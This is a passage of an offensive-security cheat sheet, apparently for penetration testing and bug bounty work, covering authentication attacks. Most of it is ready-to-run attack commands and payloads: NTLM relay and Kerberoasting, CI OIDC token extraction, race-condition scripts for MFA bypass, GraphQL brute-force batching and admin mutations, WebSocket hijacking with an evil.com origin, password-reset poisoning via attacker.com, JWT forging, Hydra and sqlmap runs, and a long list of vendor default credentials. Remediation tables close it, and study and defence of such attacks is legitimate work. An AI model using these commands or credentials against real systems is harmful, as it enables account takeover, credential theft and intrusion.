gcloud iam service-accounts get-iam-policy SA@PROJECT.iam.gserviceaccount.com
gcloud auth print-access-token --impersonate-service-account=TARGET_SA@PROJECT.iam.gserviceaccount.com
```

### NTLM Relay (Active Directory)
```bash
# Coerce authentication via NTLM relay
python3 PetitPotam.py LISTENER_IP TARGET_DC_IP
python3 DFSCoerce.py -u USER -p PASS -d DOMAIN LISTENER_IP TARGET_DC_IP

# Relay to LDAP for privilege escalation
impacket-ntlmrelayx -t ldap://DC_IP --escalate-user attacker
```

### Kerberos Attacks
```bash
# AS-REP Roasting (accounts without pre-auth required)
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -format hashcat -dc-ip DC_IP -no-pass
hashcat -a 0 -m 18200 hashes.txt rockyou.txt

# Kerberoasting (service accounts with SPNs)
impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP -request
hashcat -a 0 -m 13100 spn_hashes.txt rockyou.txt

# mTLS header bypass
curl -H 'X-Forwarded-Client-Cert: Hash=AA;Subject="CN=admin"' https://target.com/admin
```

---

## CI/CD OIDC Token Abuse

### GitHub Actions OIDC Token Extraction
```bash
# Inside GitHub Actions workflow (requires id-token: write permission)
TOKEN=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)

# Weak AWS trust policy (vulnerable - missing sub restriction)
{
  "Effect": "Allow",
  "Principal": {"Federated": "arn:aws:iam::ACCOUNT:oidc-provider/token.actions.githubusercontent.com"},
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringLike": {
      "token.actions.githubusercontent.com:sub": "repo:*"
    }
  }
}

# Secure version (restrict to specific repo + branch)
"token.actions.githubusercontent.com:sub": "repo:org/repo:ref:refs/heads/main"
```

### Weak Trust Patterns
```
Missing sub restriction entirely = any GitHub Actions workflow can assume role
Wildcard: "repo:*"            = any repo in any org
No branch restriction         = PR from fork can assume role
No environment restriction    = non-prod can get prod credentials
```

### SCIM Endpoint Abuse
```bash
curl https://target.com/scim/v2/Users
curl https://target.com/scim/v2/Groups
curl https://target.com/scim/v2/ServiceProviderConfig
# May allow unauthenticated user enumeration or account creation
```

### Container Registry Enumeration
```bash
curl https://registry.target.com/v2/_catalog
curl https://registry.target.com/v2/app/tags/list
```

---

## Race Conditions in Authentication

### Single-Packet HTTP/2 Race (Turbo Intruder)
```python
# Burp Turbo Intruder script for single-packet race
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          engine=Engine.HTTP2)
    for i in range(20):
        engine.queue(target.req, None, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    if '200' in req.response:
        table.add(req)
```

### Race Condition Targets
```
# MFA verification race
POST /verify-mfa  code=VALID_OTP  (send 10+ simultaneously)

# Password reset token race
POST /reset-password  token=VALID_TOKEN&password=Pass1!
POST /reset-password  token=VALID_TOKEN&password=Pass2!  (simultaneous)

# Registration race (same email)
POST /register  email=target@example.com&username=user1
POST /register  email=target@example.com&username=user2  (simultaneous)

# Rate limit bypass via race
# Send 50+ login attempts in a single HTTP/2 window
```

### Session Puzzling
```bash
# Step 1: Start password reset (creates auth_email session var)
POST /forgot-password  email=admin@target.com

# Step 2: Immediately visit admin (may inherit reset session context)
GET /admin
# VULNERABLE if /admin reads auth_email instead of fully-authenticated user
```

---

## GraphQL / gRPC / WebSocket Auth Bypass

### GraphQL Introspection (Schema Discovery)
```graphql
# Full schema dump
{ __schema { types { name fields { name type { name } } } } }

# Mutation listing (look for admin mutations)
{ __schema { mutationType { name fields { name args { name } } } } }
```

### GraphQL Auth Bypass Techniques
```graphql
# Batching (bypass rate limits on login)
[{"query": "mutation { login(email:\"admin@t.com\", password:\"pass1\") { token } }"},
 {"query": "mutation { login(email:\"admin@t.com\", password:\"admin\") { token } }"}]

# Aliasing (run operation multiple times in one request)
{ a1: login(email:"admin@t.com", password:"1") { token }
  a2: login(email:"admin@t.com", password:"admin") { token } }

# Unprotected admin mutations
mutation { updateUserRole(userId: "1", role: "admin") { success } }
mutation { deleteUser(userId: "2") { success } }
mutation { createApiKey(userId: "1", scope: "admin") { key } }
mutation { resetPassword(userId: "1", password: "NewPass!") { success } }
mutation { inviteUser(email: "attacker@evil.com", role: "admin") { success } }
```

### gRPC Reflection
```bash
# Discover services
grpcurl -plaintext target:50051 list
grpcurl -plaintext target:50051 describe

# Auth metadata injection
grpcurl -plaintext -H "Authorization: Bearer TOKEN" target:50051 service.Method
grpcurl -plaintext -H "x-user-id: admin" -H "x-role: admin" target:50051 service.AdminMethod
```

### WebSocket CSWSH (Cross-Site WebSocket Hijacking)
```bash
# Test WebSocket with wrong Origin
wscat -c "wss://target.com/ws" --origin "https://evil.com"

# If connection succeeds, craft CSWSH PoC
# Post-auth WebSocket injection
wscat -c "wss://target.com/ws"
# > {"type":"mfa_complete","status":"success"}
# > {"type":"skip_mfa","bypass":true}
# > {"type":"admin_command","cmd":"get_all_users"}
```

---

## Default Credentials

### Web Applications
```
WordPress: admin/admin, admin/password, admin/admin123
Drupal: admin/admin
Joomla: admin/admin, admin/password
Magento: admin/admin123
phpMyAdmin: root/(empty), root/root, root/password
```

### Databases
```
MySQL/MariaDB: root/(empty), root/root, root/password
PostgreSQL: postgres/postgres, postgres/(empty)
MongoDB: (no auth by default), admin/password
Redis: (no auth by default)
MSSQL: sa/sa, sa/(empty), sa/password
Oracle: system/oracle, sys/oracle, dbsnmp/dbsnmp
Cassandra: cassandra/cassandra
CouchDB: admin/admin
Elasticsearch: elastic/changeme
```

### Infrastructure
```
VMware vCenter/ESXi: root/vmware, root/(empty), admin/admin
Kubernetes Dashboard: (token from service account)
Docker Registry: admin/admin, admin/password
Portainer: admin/admin
Grafana: admin/admin
Kibana: elastic/elastic
Jenkins: admin/admin, admin/password
GitLab: root/5iveL!fe (old default)
Prometheus: (no auth by default)
Nagios: nagiosadmin/nagios
```

### Network Devices
```
Cisco IOS: cisco/cisco, (empty)/(empty), admin/cisco
Juniper: root/(empty), admin/admin@123
Fortinet: admin/(empty), admin/admin
Palo Alto: admin/admin
F5 BIG-IP: admin/admin
MikroTik: admin/(empty)
Ubiquiti: ubnt/ubnt
Netgear: admin/password, admin/1234
TP-Link: admin/admin, admin/(empty)
```

### Industrial / IPMI
```
Dell iDRAC: root/calvin
HP iLO: Administrator/(printed on tag)
Supermicro IPMI: admin/admin, ADMIN/ADMIN
IBM IMM: USERID/PASSW0RD
```

---

## Attack Chains

### Chain 1: Account Takeover via Password Reset
```
1. Enumerate valid email via registration/forgot-password response diff
2. Trigger reset with Host: attacker.com (or X-Forwarded-Host)
3. Capture token from attacker's access logs
4. POST /reset-password token=CAPTURED_TOKEN&password=NewPass1!
```

### Chain 2: JWT Weak Secret to Admin Takeover
```
1. Capture JWT from Authorization header or cookie
2. Crack HMAC secret: jwt_tool TOKEN -C -d wordlist.txt
3. Forge new JWT: jwt_tool TOKEN -I -pc role -pv admin -S hs256 -p "CRACKED_SECRET"
4. Replace token in requests = admin access
```

### Chain 3: OAuth CSRF + Redirect to Account Takeover
```
1. Enumerate OAuth endpoints: GET /.well-known/oauth-authorization-server
2. Craft auth URL with no state parameter (CSRF) + attacker redirect_uri
3. Social-engineer victim to click URL
4. Capture authorization code at attacker's server
5. Exchange code: POST /oauth/token grant_type=authorization_code&code=CODE
6. Use access token for full account access
```

### Chain 4: SAML XSW + Attribute Injection
```
1. Capture valid SAML response in Burp
2. Load in SAML Raider: Extensions to SAML Raider
3. Apply XSW1 attack + change NameID to admin@target.com
4. Forward modified response to SP's ACS endpoint
5. Access admin resources
```

### Chain 5: CI/CD OIDC to AWS Privilege Escalation
```
1. Identify GitHub Actions workflow with id-token: write
2. Find associated AWS role with weak trust (wildcard sub)
3. Create fork of repo, trigger workflow to request OIDC token
4. Assume AWS role with weak trust policy
5. Enumerate IAM permissions: pacu to run iam__privesc_scan
6. Escalate to admin
```

### Chain 6: MFA Bypass via Race Condition
```
1. Authenticate with valid credentials (get partial-auth session)
2. Obtain valid TOTP code
3. Launch Turbo Intruder single-packet attack: 20 simultaneous /verify-mfa requests
4. First success grants full session before server can invalidate code
5. Use full session to access admin panel
```

---

## Tool Command Reference

### jwt-attacks.sh Usage
```bash
./jwt-attacks.sh TOKEN --decode
./jwt-attacks.sh TOKEN --none-alg
./jwt-attacks.sh TOKEN --strip
./jwt-attacks.sh TOKEN --crack /usr/share/wordlists/rockyou.txt
./jwt-attacks.sh TOKEN --key-confusion public.pem
./jwt-attacks.sh TOKEN --tamper CRACKED_SECRET
./jwt-attacks.sh TOKEN --kid
./jwt-attacks.sh TOKEN --jku https://attacker.com
./jwt-attacks.sh TOKEN --all
```

### Python Tools
```bash
python tools/auth-tester.py https://target.com
python tools/enum-users.py https://target.com --wordlist users.txt
python tools/cloud-iam-tester.py aws
python tools/cloud-iam-tester.py azure
python tools/cloud-iam-tester.py gcp
python tools/framework-bypass-tester.py https://target.com
python tools/graphql-auth-tester.py https://target.com/graphql
python tools/race-condition-tester.py https://target.com
python tools/session-analyzer.py https://target.com
```

### Hydra
```bash
# HTTP form brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com \
  http-post-form "/login:user=^USER^&pass=^PASS^:Invalid credentials"

# OTP brute force
ffuf -u https://target.com/api/verify-otp -X POST \
  -H "Content-Type: application/json" \
  -H "Cookie: session=TOKEN" \
  -d '{"otp":"FUZZ"}' -w otp_wordlist.txt -fc 401
```

### sqlmap on Login
```bash
sqlmap -u "http://target.com/login" \
  --data="username=admin&password=test" \
  --level=5 --risk=3 \
  --dbms=mysql --technique=BEUSTQ
```

### Nuclei Auth Templates
```bash
nuclei -t ~/nuclei-templates/exposures/ -u https://target.com
nuclei -t ~/nuclei-templates/misconfiguration/ -u https://target.com
nuclei -t ~/nuclei-templates/vulnerabilities/generic/auth-bypass.yaml -u https://target.com
```

---

## CVSS & Bug Bounty Impact Reference

| Vulnerability | CVSS Base | Severity | Typical Bounty |
|---|---|---|---|
| Auth bypass (unauthenticated) | 9.8 | Critical | $5k-$50k |
| Account takeover (any user) | 8.8 | High | $2k-$20k |
| MFA bypass | 8.1 | High | $1k-$10k |
| Admin privilege escalation | 8.8 | High | $2k-$15k |
| JWT alg:none | 9.1 | Critical | $3k-$30k |
| Password reset poisoning | 7.5-9.8 | High-Critical | $1k-$10k |
| OAuth account takeover | 8.8 | High | $2k-$20k |
| SAML auth bypass | 9.8 | Critical | $5k-$50k |
| Session fixation | 7.4 | High | $500-$5k |
| Account enumeration | 5.3 | Medium | $100-$500 |
| Weak token entropy | 5.9 | Medium | $200-$2k |

---

## OWASP / Standard Remediations

| Vulnerability Class | Fix |
|---|---|
| JWT algorithm confusion | Hardcode expected algorithm server-side; reject alg:none |
| JWT weak secret | 256-bit+ random secret; prefer RS256/ES256 |
| OAuth missing state | Enforce cryptographically random state; bind to session |
| SAML signature bypass | Verify signature before processing; reject unsigned assertions |
| MFA bypass | Server-side session state machine; block direct endpoint access pre-MFA |
| Password reset poisoning | Use request.host from app config, not HTTP headers |
| Account enumeration | Constant-time responses; identical messages for valid/invalid |
| Session fixation | Regenerate session ID on successful authentication |
| SQL injection | Parameterized queries / prepared statements |
| NoSQL injection | Schema validation; avoid $where / JS evaluation |
| Race condition | Database-level locking; atomic operations; idempotency keys |
| Path traversal bypass | Normalize paths before ACL check; use allowlists |

---

## References

- PortSwigger Web Security Academy: JWT, OAuth, SAML, Authentication labs
- OWASP Testing Guide v4.2 (OTG-AUTHN-*)
- OWASP ASVS v4.0 Section V2 (Authentication)
- NIST SP 800-63B Digital Identity Guidelines
- CVE-2022-21449 (Java ECDSA blank signature)
- CVE-2025-29927 (Next.js middleware bypass)
- CVE-2024-3596 (Blast-RADIUS)
- RFC 7519 (JWT), RFC 6749 (OAuth 2.0), RFC 8693 (Token Exchange), RFC 9449 (DPoP)
- HackerOne Hacktivity: authentication category reports
- Bug Bounty case studies: Instagram $15k (MFA bypass), Microsoft $13k (MFA bypass), Shopify $6k (race condition), Grammarly $5k (OAuth)
